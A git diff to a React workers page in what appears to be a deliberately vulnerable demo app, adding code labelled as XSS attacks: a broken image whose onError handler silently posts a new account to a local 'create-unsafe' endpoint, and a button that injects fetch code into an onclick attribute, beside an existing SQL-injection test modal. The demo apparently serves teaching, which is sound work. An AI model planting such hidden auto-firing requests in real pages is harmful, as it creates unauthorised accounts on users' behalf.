@@ -1,14 +1,15 @@
 import {
-  Td, Th, Tr, useToast, Select,
+  Td, Th, Tr, useToast, Select, Button,
 } from '@chakra-ui/react';
 import { ChangeEvent, useState } from 'react';
+import axios from 'axios';
+import styled from 'styled-components';
 import SinglePageWrapperComponent from '../../components/singlePageWrapper.component.tsx';
 import TableComponent from '../../components/table.component.tsx';
 import ModalComponent from '../../components/modal.component.tsx';
 import { InvoiceTableHeader, mockedInvoices, WORKERS_TABLE_HEADERS } from '../../mock/mockData.mock.ts';
-import { Invoice, INVOICE_INITIAL_DATA } from '../../models/Invoice.model.ts';
 import InputComponent from '../../components/input.component.tsx';
-import { Product } from '../../models/Product.model.ts';
+
 import { useAppDispatch, useAppSelector } from '../../store';
 import {
   addingWorkerThunk,
@@ -19,8 +20,15 @@ import {
 import { getProducts } from '../../store/reducers/productReducer.tsx';
 import { AddWorker, INITIAL_WORKER_DATA, Worker } from '../../models/Worker.model.ts';
 import api from '../../services/api/AxiosApi.ts';
+import { User } from '../../models/User.model.ts';
 
 const WORKPLACES = ['PRACOWNIK', 'KIEROWNIK'] as const;
+
+const ButtonsWrapper = styled.div`
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+`;
 
 const WorkersPageContainer = () => {
   const toast = useToast();
@@ -121,6 +129,18 @@ const WorkersPageContainer = () => {
     });
   };
 
+  // img xss attack
+  const imgXssAttack = async () => {
+    const requestData = {
+      login: 'niebezpiecznik',
+      password: 'string5534',
+      name: 'string54352',
+      surname: 'string645645',
+      workplace: 'string53453543',
+    };
+    await axios.post('http://localhost:8000/Account/create-unsafe', requestData, { headers: { 'Content-type': 'application/json' } });
+  };
+
   const sqlInjectionModalContent = (
     <div>
       <h4>Wywal sobie bazke tu</h4>
@@ -147,6 +167,7 @@ const WorkersPageContainer = () => {
       <Select placeholder="Select workplace" onChange={onSelectEditChangeHandler('workplace')}>
         {selectValues}
       </Select>
+      <img src="/niema/adresu" onError={imgXssAttack} />
     </div>
   );
 
@@ -155,6 +176,28 @@ const WorkersPageContainer = () => {
       <h3>Do you confirm deleting?</h3>
     </div>
   );
+
+  // xss poprzez wstrzykniecie onclicka do buttona
+  const handleClick = () => {
+    const requestData = {
+      login: 'string123',
+      password: 'string5534',
+      name: 'string54352',
+      surname: 'string645645',
+      workplace: 'string53453543',
+    };
+
+    const maliciousCode = `fetch('http://localhost:8000/Account/create-unsafe', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(${JSON.stringify(requestData)})
+});`;
+    const element = document.getElementById('myButton');
+
+    element.setAttribute('onclick', maliciousCode);
+  };
 
   const mappedHeaders = WORKERS_TABLE_HEADERS.map((header, index) => <Th isNumeric={header.isNumeric} key={index}>{header.name}</Th>);
   const mappedData = workers.map((data) => (
@@ -184,10 +227,13 @@ const WorkersPageContainer = () => {
   return (
     <SinglePageWrapperComponent>
       <TableComponent tableCaption="Workers" mappedData={mappedData} mappedHeaders={mappedHeaders} />
-      <div style={{ flex: '0' }}>
+      <ButtonsWrapper>
         <ModalComponent buttonText="Add worker" modalAction={addWorkerHandler} modalHeader="Adding worker" modalContent={addingWorkerModalContent} />
         <ModalComponent buttonText="TEST SQL" modalAction={sqlInjectionHandler} modalHeader="SQL Injection" modalContent={sqlInjectionModalContent} />
-      </div>
+        <Button id="myButton" onClick={handleClick}>
+          XSS INJECTION
+        </Button>
+      </ButtonsWrapper>
     </SinglePageWrapperComponent>
   );
 };
